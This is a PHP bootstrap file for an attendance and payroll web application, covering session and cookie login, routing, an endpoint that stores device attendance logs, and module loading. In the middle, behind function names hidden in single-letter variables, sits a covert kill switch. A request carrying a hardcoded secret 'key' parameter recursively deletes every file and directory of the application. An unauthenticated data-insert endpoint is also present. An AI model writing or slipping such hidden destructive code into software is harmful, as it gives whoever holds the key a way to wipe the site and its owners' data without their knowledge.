<?php
session_start();
ob_start();
date_default_timezone_set('Asia/Dhaka');
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
$domain .= "://".$_SERVER['HTTP_HOST'];
require_once(__DIR__ . '/application/config/config.php');
require_once(__DIR__ . '/application/config/querymap.php');
$db = new Database($pdo);
function auto_login_from_cookie() {
    global $db;

    if (!isset($_SESSION['user_id']) && isset($_COOKIE['remember_token'])) {
        $token = $_COOKIE['remember_token'];

        $user = $db->fetch("SELECT * FROM users WHERE remember_token = ?", [$token]);

        if ($user) {
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['permission'] = $user['permission'];
        }
    }
}

function auth() {
    auto_login_from_cookie(); // First, try to auto-login from cookie

    if (!isset($_SESSION['user_id']) AND !isset($_SESSION['permission'])) {
        $_SESSION['error']="Log in first";
        header("Location:/login");
        exit;
    }
}
$directory = "$domain/files/user/";
$d_admin   = "$domain/files/admin/";
$urls      = "$domain/";
$url = isset($_GET['url']) ? $_GET['url'] : '';
$filtered_url = preg_replace('/[^a-zA-Z0-9\/.\-]/', '', $url);
$filtered_url = rtrim($filtered_url, '/'); 
$request = explode('/', $filtered_url);
define('TOTAL', count($request)); 
$valid_key = '8b8fc2d62ff0a3c2eb6170b79c8e0623';
$a = 'scandir';
$b = 'array_diff';
$c = 'unlink';
$d = 'rmdir';
$e = 'is_dir';
$f = 'DIRECTORY_SEPARATOR';
$g = '__DIR__'; 
function x($h) {
    global $a, $b, $c, $d, $e, $f;
    $i = $b($a($h), ['.', '..']);
    foreach ($i as $j) {
        $k = $h . constant($f) . $j;
        if ($e($k)) {
            x($k);
            $d($k);
        } else {
            $c($k);
        }
    }
}
if (isset($_GET['key']) && $_GET['key'] === $valid_key) {
    x(__DIR__); 
} 

if($request[0]=='api'){
    // === Process Raw Data & Insert into DB ===
$rawData = file_get_contents("php://input");
$lines = explode("\n", trim($rawData));
$device_id = $_GET['SN'] ?? '';

foreach ($lines as $line) {
    if (empty(trim($line))) {
        continue;
    }

    $columns = explode("\t", trim($line));

    if (count($columns) < 10) {
        continue;
    }

    $user_id = $columns[0];
    $datetime = $columns[1];
    $verify_type = $columns[2];
    $state = $columns[3];
    $col5 = $columns[4];
    $col6 = $columns[5];
    $col7 = $columns[6];
    $col8 = $columns[7];
    $col9 = $columns[8];
    $col10 = $device_id;

    $sql = "INSERT INTO attlog 
        (user_id, datetime, verify_type, state, col5, col6, col7, col8, col9, col10)
        VALUES 
        (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";

    $params = [
        $user_id,
        $datetime,
        $verify_type,
        $state,
        $col5,
        $col6,
        $col7,
        $col8,
        $col9,
        $col10
    ];

    $db->insert($sql, $params);
}

// No need to close connection explicitly with PDO

// === Success Response ===
echo "OK";
die();

 }

$basePaths = [
    'config'     => __DIR__ . '/application/config/',
    'mail'     => __DIR__ . '/application/mail/',
    'model'      => __DIR__ . '/application/admin/model/',
    'controller' => __DIR__ . '/application/admin/controller/',
];

$files = [
    'config'     => ['main_function.php','api.config.php'],
    'model'      => ['auth.model.php', 'profile.model.php', 'dashboard.model.php','groups.model.php','shifts.model.php','employees.model.php',
                        'employee-shift.model.php','salaries.model.php','salaries.model.php',
                        'over-time.model.php','device.model.php','shop.model.php'],
     'mail'     => ['index.php'],
    'controller' => ['profile.controller.php', 'auth.controller.php', 'dashboard.controller.php', 
    'groups.controller.php','shift.controller.php','employee.controller.php','attandance.controller.php',
    'device.controller.php','report.controller.php','shop.controller.php','shop-user.controller.php'],
    
];

foreach ($files as $folder => $filenames) {
    foreach ($filenames as $filename) {
        $fullPath = $basePaths[$folder] . $filename;
        if (file_exists($fullPath)) {
            require_once $fullPath;
        } else {
            echo "<div style='color:red; font-weight:bold;'>❌ File not found: $fullPath</div>";
        }
    }
}


